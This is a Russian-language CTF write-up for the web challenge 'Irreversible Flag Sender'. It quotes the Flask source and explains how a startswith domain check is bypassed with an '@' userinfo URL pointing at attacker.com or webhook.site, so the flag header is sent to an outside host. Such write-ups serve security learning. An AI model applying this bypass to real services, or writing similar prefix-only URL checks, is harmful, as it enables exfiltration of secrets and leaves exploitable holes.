# Irreversible Flag Sender

## Overview

**Категория:** WEB  
**Сложность:** Medium

В задаче даётся сайт, который "безвозвратно" отправляет флаг на указанный домен через POST-запрос. Флаг нельзя получить напрямую через интерфейс — он отправляется только на внешний сервер по запросу пользователя, но поле выбора домена ограничено одним значением: `https://ctf.cert.unlp.edu.ar`.

---

## Анализ

### Разведка

Мы получили архив с исходниками приложения, а также ссылку на боевой сервер:  
[https://flagsender.ctf.cert.unlp.edu.ar/](https://flagsender.ctf.cert.unlp.edu.ar/)

Код приложения показывает, что флаг отправляется в заголовке `Flag` на `POST {domain}/irreversible_receiver` только если значение поля `domain` начинается с `https://ctf.cert.unlp.edu.ar`.  
В интерфейсе на сайте можно выбрать только этот домен, но на сервере стоит простая проверка через `startswith`, что даёт пространство для атак.

### Детальный анализ

Ключевая часть backend:

```python
@app.route('/send_flag', methods=['POST'])
def send_flag():
    target_domain = request.form.get('domain', '')
    if not target_domain.startswith(ALLOWED_DOMAIN):
        return jsonify({"error": "Invalid URL"}), 400
    try:
        result = transmit_flag(target_domain)
        return jsonify({"success": "Flag sent irreversibly!", "domain": target_domain, "response": result})
    except Exception as e:
        return jsonify({"error": f"Error during transmission: {e}"}), 500

def transmit_flag(url):
    global flag
    data = {"domain": url}
    response = requests.post(
        f"{url}/irreversible_receiver",
        verify=False,
        allow_redirects=False,
        json=data,
        headers={"Flag": flag}
    )
    return "Transmission complete — flag lost forever."
```

#### В чём уязвимость?

- Проверка на разрешённый домен делается только методом `.startswith()`.
- Это позволяет отправить домен вида  
    `https://ctf.cert.unlp.edu.ar@attacker.com/irreversible_receiver`,  
    и тогда Python интерпретирует всё до `@` как username, а реальный запрос уйдёт на `attacker.com`.
- Таким образом, можно получить флаг через SSRF.

#### Фронтенд:

В интерфейсе `<select>` с единственным доменом. Но значение легко подменить через DevTools.

---

## Решение

### Подход

Используем SSRF, подменив значение domain в форме на  
`https://ctf.cert.unlp.edu.ar@webhook.site/ВАШ_ID/irreversible_receiver`.  
Так как на сервере только `.startswith`, запрос уйдёт на ваш endpoint, а в заголовке будет флаг.

### Эксплойт / Скрипт

**1. Получаем свой endpoint на [webhook.site](https://webhook.site/)**

**2. В браузере открываем DevTools и подменяем HTML:**

```html
<select name="domain" id="domain" class="block w-full p-2 border rounded">
    <option value="https://ctf.cert.unlp.edu.ar">https://ctf.cert.unlp.edu.ar</option>
    <option value="https://ctf.cert.unlp.edu.ar@webhook.site/ВАШ_ID/irreversible_receiver">
        https://ctf.cert.unlp.edu.ar@webhook.site/ВАШ_ID/irreversible_receiver
    </option>
</select>
```

**3. Выбираем второй пункт, проходим капчу и отправляем.**

**4. Получаем запрос в логах webhook.site:**

```
POST /ВАШ_ID/irreversible_receiver HTTP/1.1
Host: webhook.site
Flag: flag{реальный_флаг}
...
```

---

### Шаги выполнения

1. Создайте endpoint на [webhook.site](https://webhook.site/)
2. Откройте сайт флага и откорректируйте HTML через DevTools, добавив свой домен с `@`.
3. Выберите свой пункт, отправьте форму, пройдите капчу.
4. Найдите флаг в заголовке Flag в пришедшем запросе.

---

![Irreversible](../../img/Irreversible.png)